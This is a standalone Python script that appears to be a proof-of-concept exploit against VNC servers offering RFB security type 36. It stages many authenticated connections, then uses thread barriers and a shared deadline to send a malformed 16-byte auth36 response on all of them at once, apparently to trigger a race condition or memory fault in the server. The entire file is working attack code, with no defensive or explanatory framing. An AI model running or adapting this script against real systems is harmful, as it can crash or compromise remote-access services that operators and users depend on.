#!/usr/bin/env python3

import argparse
import socket
import struct
import threading
import time


RFB_VERSION = b"RFB 003.008\n"
AUTH36 = 36
MALFORMED = struct.pack(">I", 16) + (b"\x00" * 12)


def recv_exact(sock, n):
    data = bytearray()
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError(f"short read: wanted {n}, got {len(data)}")
        data.extend(chunk)
    return bytes(data)


def connect_ipv4(host, port):
    for family, socktype, proto, _, sockaddr in socket.getaddrinfo(
        host, port, socket.AF_INET, socket.SOCK_STREAM
    ):
        sock = socket.socket(family, socktype, proto)
        sock.settimeout(30.0)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try:
            sock.connect(sockaddr)
            return sock
        except Exception:
            sock.close()
    raise ConnectionError(f"unable to connect to {host}:{port} over IPv4")


def build_entry(username):
    user = username.encode()
    inner = bytearray(11 + len(user))
    struct.pack_into(">I", inner, 0, len(inner) - 4)
    struct.pack_into(">H", inner, 4, 0)
    struct.pack_into(">H", inner, 6, len(user))
    inner[8 : 8 + len(user)] = user
    struct.pack_into(">H", inner, 8 + len(user), 0)
    inner[10 + len(user)] = 0
    return bytes([AUTH36]) + struct.pack(">I", len(inner)) + inner


def stage(host, port, username):
    sock = connect_ipv4(host, port)
    banner = recv_exact(sock, 12)
    if not banner.startswith(b"RFB "):
        sock.close()
        raise RuntimeError(f"unexpected banner: {banner!r}")
    sock.sendall(RFB_VERSION)

    sec_count = recv_exact(sock, 1)[0]
    if sec_count == 0:
        reason_len = struct.unpack(">I", recv_exact(sock, 4))[0]
        reason = recv_exact(sock, reason_len).decode("utf-8", "replace")
        sock.close()
        raise RuntimeError(f"server rejected before security selection: {reason}")

    sec_types = recv_exact(sock, sec_count)
    if AUTH36 not in sec_types:
        sock.close()
        raise RuntimeError(f"auth36 not offered: {list(sec_types)}")
    sock.sendall(bytes([AUTH36]))
    sock.sendall(build_entry(username))

    challenge_len = struct.unpack(">I", recv_exact(sock, 4))[0]
    recv_exact(sock, challenge_len)
    return sock, challenge_len


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=5900)
    ap.add_argument("--username", default="wronguser")
    ap.add_argument("--count", type=int, default=1)
    ap.add_argument("--hold", type=int, default=30)
    ap.add_argument(
        "--send-delay",
        type=float,
        default=0.250,
        help="seconds to wait after all sender threads are ready before transmit",
    )
    ap.add_argument(
        "--spin-window-us",
        type=int,
        default=2000,
        help="busy-wait window before the shared send deadline in microseconds",
    )
    args = ap.parse_args()

    staged = []
    for i in range(1, args.count + 1):
        try:
            sock, challenge_len = stage(args.host, args.port, args.username)
            staged.append((i, sock, challenge_len))
            print(f"[{i}] ready challenge_len={challenge_len}")
        except Exception as exc:
            print(f"error: [{i}] {exc}")
            for _, sock, _ in staged:
                try:
                    sock.close()
                except Exception:
                    pass
            return 1

    ready = threading.Barrier(len(staged) + 1)
    fire = threading.Event()
    deadline = 0.0
    errors = []

    def sender(i, sock, challenge_len):
        try:
            ready.wait()
            fire.wait()
            spin_window = max(0.0, args.spin_window_us / 1_000_000.0)
            coarse_sleep_until = deadline - spin_window
            while True:
                now = time.perf_counter()
                if now >= deadline:
                    break
                if now < coarse_sleep_until:
                    time.sleep(min(coarse_sleep_until - now, 0.001))
                    continue
                # Final short spin to reduce scheduler wakeup jitter right before send.

            sock.sendall(MALFORMED)
            sent_at = time.perf_counter_ns()
            print(
                f"[{i}] sent malformed auth36 challenge_len={challenge_len} "
                f"sent_at_ns={sent_at}"
            )
        except Exception as exc:
            errors.append(f"[{i}] {exc}")

    threads = []
    for item in staged:
        t = threading.Thread(target=sender, args=item, daemon=True)
        threads.append(t)
        t.start()

    ready.wait()
    deadline = time.perf_counter() + max(args.send_delay, 0.0)
    # Share an absolute deadline instead of a simple event release so each sender
    # can sleep/spin locally toward the same target time.
    fire.set()

    for t in threads:
        t.join()

    for err in errors:
        print(f"error: {err}")

    time.sleep(args.hold)
    for _, sock, _ in staged:
        try:
            sock.close()
        except Exception:
            pass
    return 1 if errors else 0


if __name__ == "__main__":
    raise SystemExit(main())
